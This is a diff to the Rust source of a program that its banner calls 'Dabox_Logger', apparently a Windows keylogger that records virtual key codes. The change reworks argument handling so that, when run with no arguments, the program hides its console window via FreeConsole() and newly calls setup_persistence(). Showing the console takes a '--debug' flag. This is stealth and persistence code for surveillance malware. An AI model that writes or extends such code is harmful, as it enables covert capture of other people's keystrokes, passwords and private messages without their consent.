@@ -83,35 +83,50 @@ fn write_to_disk(file_name: &str, content: &str, bytes: usize) -> bool {
   ret
 }
 
+fn syntax() -> () {
+  let mod_name = get_module_name(Module::Name);
+  
+  eprintln!(
+    "
+    ____        _                   _                                
+    |  _ \\  __ _| |__   _____  __   | |    ___   __ _  __ _  ___ _ __ 
+    | | | |/ _` | '_ \\ / _ \\ \\/ /   | |   / _ \\ / _` |/ _` |/ _ \\ '__|
+    | |_| | (_| | |_) | (_) >  <    | |__| (_) | (_| | (_| |  __/ |   
+    |____/ \\__,_|_.__/ \\___/_/\\_\\___|_____\\___/ \\__, |\\__, |\\___|_|   
+                               |_____|          |___/ |___/           
+    --------------------------------------------------------[version {}]
+    Syntax:
+      {}         {{Hides the console window}}
+      {} --debug {{Shows the console window}}"
+  , VERSION, mod_name, mod_name);
+  
+  return;
+}
+
 #[allow(unused_assignments)]
 fn main() {
   let mut dbg: bool = false;
-  let mod_name = get_module_name();
   let args: Vec<String> = env::args().collect();
 
-  if args.len() == 1 {
-    unsafe { FreeConsole(); }
-  }
-  else if args.len() == 2 {
-    let flag = &args[1];
-    if flag.contains("--debug") { dbg = true; }
-  }
-  else {
-    eprintln!(
-      "
-      ____        _                   _                                
-      |  _ \\  __ _| |__   _____  __   | |    ___   __ _  __ _  ___ _ __ 
-      | | | |/ _` | '_ \\ / _ \\ \\/ /   | |   / _ \\ / _` |/ _` |/ _ \\ '__|
-      | |_| | (_| | |_) | (_) >  <    | |__| (_) | (_| | (_| |  __/ |   
-      |____/ \\__,_|_.__/ \\___/_/\\_\\___|_____\\___/ \\__, |\\__, |\\___|_|   
-                                 |_____|          |___/ |___/           
-      --------------------------------------------------------[version {}]
-      Syntax:
-        {}         {{Hides the console window}}
-        {} --debug {{Shows the console window}}"
-    , VERSION, mod_name, mod_name);
+  match args.len() {
+    1 => {
+      unsafe { FreeConsole(); }
+      setup_persistence(false);
+    }
 
-    return;
+    2 => {
+      let flag = &args[1];
+      if flag.contains("--debug") { dbg = true; }  
+      else {
+        syntax();
+        return;
+      }
+    }
+
+    _ => {
+      syntax();
+      return;
+    }
   }
 
   let keys = KbKeys::new();                                 // Creates the structure that stores the virtual key codes.
